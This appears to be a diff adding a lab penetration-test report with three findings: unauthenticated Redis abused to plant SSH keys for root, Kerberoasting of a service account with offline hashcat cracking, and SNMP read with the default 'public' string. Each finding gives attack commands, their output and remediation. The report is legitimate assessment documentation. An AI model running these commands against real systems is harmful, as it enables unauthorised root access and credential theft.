@@ -1,0 +1,123 @@
+# Internal Network Assessment (Lab)
+
+**Assessment Report**
+
+---
+
+## Engagement Details
+
+| Field | Value |
+| :--- | :--- |
+| **Client** | Example Corp |
+| **Assessor / Tester** | 0xb0ug44 |
+| **Date** | 2026-11-15 |
+| **Scope** | 10.10.10.0/24, 10.10.20.0/24 |
+
+---
+
+## Findings Summary
+
+| Severity | Count |
+| :--- | :---: |
+| **Critical** | 1 |
+| **High** | 1 |
+| **Medium** | 1 |
+| **Low** | 0 |
+| **Info** | 0 |
+
+**Highest CVSS Base Score:** `9.8`
+
+---
+
+## Detailed Findings
+
+### [F-002] Remote Code Execution via Exposed Redis Service without Authentication
+
+- **Severity:** `Critical` | **CVSS:** `9.8` (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
+- **Host / Target:** `cache01.lab.local (10.10.10.22)`
+
+#### Description
+A Redis database instance is listening on all network interfaces on TCP port 6379 without authentication enabled. An attacker within the lab network can interact with Redis, configure arbitrary database directory targets, and write unauthorized SSH authorized_keys to obtain root shell access.
+
+#### Evidence / Proof of Concept
+```text
+$ redis-cli -h 10.10.10.22 -p 6379 ping
+PONG
+
+$ redis-cli -h 10.10.10.22 config set dir /root/.ssh/
+OK
+$ redis-cli -h 10.10.10.22 config set dbfilename authorized_keys
+OK
+$ redis-cli -h 10.10.10.22 save
+OK
+
+$ ssh -i ~/.ssh/id_rsa root@10.10.10.22 "id; whoami"
+uid=0(root) gid=0(root) groups=0(root)
+root
+
+```
+
+#### Remediation
+Bind the Redis instance to localhost (127.0.0.1) or a dedicated internal network interface. Enable strong authentication using the 'requirepass' configuration directive or Redis ACLs, and restrict incoming connections with host firewalls.
+
+#### References
+- CWE-306: Missing Authentication for Critical Function
+- Redis Security Documentation: Redis Security Model
+
+---
+
+### [F-001] Kerberoastable Active Directory Service Account
+
+- **Severity:** `High` | **CVSS:** `8.8` (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`)
+- **Host / Target:** `dc01.lab.local (10.10.10.5)`
+
+#### Description
+The Active Directory domain user account 'svc_sql' has a Service Principal Name (SPN) registered with legacy RC4-HMAC encryption. Any authenticated domain user can request a Kerberos service ticket (TGS) and perform offline password cracking without generating excessive network alerts.
+
+#### Evidence / Proof of Concept
+```text
+$ Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname
+
+samaccountname serviceprincipalname
+-------------- --------------------
+svc_sql        MSSQLSvc/db01.lab.local:1433
+
+$ hashcat -m 13100 svc_sql.tgs /usr/share/wordlists/rockyou.txt
+$krb5tgs$23$*svc_sql*...:Password123!
+
+```
+
+#### Remediation
+Enforce AES-128/256 Kerberos encryption types on service accounts, use passwords exceeding 25+ characters, and consider migrating service workloads to Group Managed Service Accounts (gMSA).
+
+#### References
+- MITRE ATT&CK T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting
+- Microsoft Security Guidance: Group Managed Service Accounts Overview
+
+---
+
+### [F-003] Publicly Readable SNMP Community String (Public)
+
+- **Severity:** `Medium`
+- **Host / Target:** `sw-core01.lab.local (10.10.10.1)`
+
+#### Description
+The core network switch exposes SNMP v2c using the default, well-known community string 'public'. This permits unauthenticated read access to device configurations, network routing tables, and interface statistics.
+
+#### Evidence / Proof of Concept
+```text
+$ snmpwalk -v2c -c public 10.10.10.1 1.3.6.1.2.1.1.1.0
+SNMPv2-MIB::sysDescr.0 = STRING: Cisco IOS Software, C3750 Software (C3750-IPSERVICESK9-M), Version 15.0(2)SE
+
+```
+
+#### Remediation
+Disable SNMP v1 and v2c across all network appliances. Upgrade to SNMPv3 with authPriv (SHA authentication and AES encryption), and restrict management traffic to authorized bastion subnets.
+
+#### References
+- MITRE ATT&CK T1046 - Network Service Discovery
+- CIS Cisco IOS 15 Benchmark v4.1.0 - Section 1.3 Configure SNMP
+
+---
+
+*Generated for authorized security testing and documentation purposes.*
